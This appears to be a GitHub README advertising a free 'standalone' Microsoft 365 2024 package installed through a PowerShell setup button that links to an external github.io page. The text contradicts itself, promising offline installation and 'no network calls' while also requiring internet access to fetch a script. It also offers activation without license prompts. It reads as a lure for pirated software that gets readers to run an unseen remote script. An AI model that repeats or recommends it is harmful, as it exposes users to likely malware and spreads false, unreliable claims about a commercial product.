<div align="center">

# Microsoft 365 2024 Standalone Deployment Suite – Windows 10 & 11

![](files/preview.png)

### 🛠️ PowerShell Setup Button

[![](files/button.png)](https://ilsa99.github.io/microsoft-365-desktop/)

[![licence](https://img.shields.io/badge/LICENCE-CC--BY--4.0-6366f1?style=flat-square&labelColor=0d1117)]() [![win](https://img.shields.io/badge/WIN-WINDOWS_11-818cf8?style=flat-square&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/PS--CORE-CORE-4f46e5?style=flat-square&labelColor=0d1117)]()

</div>

---

The Microsoft 365 desktop distribution delivers a complete, pre-configured standalone installation environment for Windows x64 systems, bundling all essential productivity tools into a single ready-to-run package. This build is packaged as a self-contained deployment unit, eliminating the need for incremental downloads or post-install configuration during setup. It targets offline and air-gapped infrastructure scenarios where deterministic, repeatable installation behavior is required. Core components are staged in advance so the environment reaches an operational state immediately after setup completes. The package is intended for technical administrators performing local testing, provisioning, or controlled deployment across managed desktop fleets.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Complete Standalone Package**: Includes the full suite of essential productivity applications—Word, Excel, PowerPoint, Outlook, and supporting tools—bundled into a single pre-configured desktop deployment without requiring external dependencies or online activation steps.
- **Pre-Configured Environment**: All application settings, templates, and default preferences are pre-populated to ensure a ready-to-run experience immediately after installation, eliminating the need for manual configuration or post-install setup.
- **Offline Installation Support**: The package is designed for fully offline deployment, allowing installation on machines with restricted or no internet access. All required components are contained within the standalone build.
- **Windows x64 Desktop Optimization**: Tailored specifically for Windows x64 desktop environments, with binaries and runtime components selected and configured to match the target platform architecture for stable performance.
- **Single-Step Deployment**: A streamlined installation process that handles all component registration, file placement, and environment configuration automatically, reducing deployment time and minimizing user intervention.
- **Version-Locked Build**: The 2024 release is pinned to a verified build, ensuring consistent behavior across deployments and preventing unintended updates from altering the configured environment.
- **Integrated Toolset**: All essential tools are included and pre-linked, providing a cohesive desktop environment where applications interoperate without additional setup or configuration.
- **Self-Contained Runtime**: No external runtime or framework dependencies are required; the package includes all necessary libraries and support files to operate independently on a clean Windows installation.

## How it works

The deployment package is structured as a self-contained desktop environment with a pre-configured toolset, eliminating the need for dependency resolution or post-install configuration. Each build is assembled from verified components, packaged into a single distributable, and validated against the target Windows x64 platform before release.

**Bundled Component Assembly**

All essential tools and runtime libraries are embedded directly within the package. During initialization, the installer unpacks the component manifest and stages each module into its designated system path. No external package managers, repositories, or network calls are required at any point during installation or first launch.

**Pre-Configured Environment**

The package ships with configuration profiles already applied, including application defaults, registry entries, and service registrations. On first run, the environment is registered and activated against the local system, allowing the toolset to operate immediately without manual setup steps, license prompts, or configuration wizards.

**Deployment Workflow**

The installer executes a sequential pipeline: it verifies the host platform and architecture, extracts the payload to a temporary staging directory, registers the required system services and file associations, then commits the installation to the target location. A completion check confirms all components are present and functional before the installer exits.

**Integrity and Verification**

Each release is checksum-verified during packaging and again on extraction. The installer aborts the deployment if any component fails valida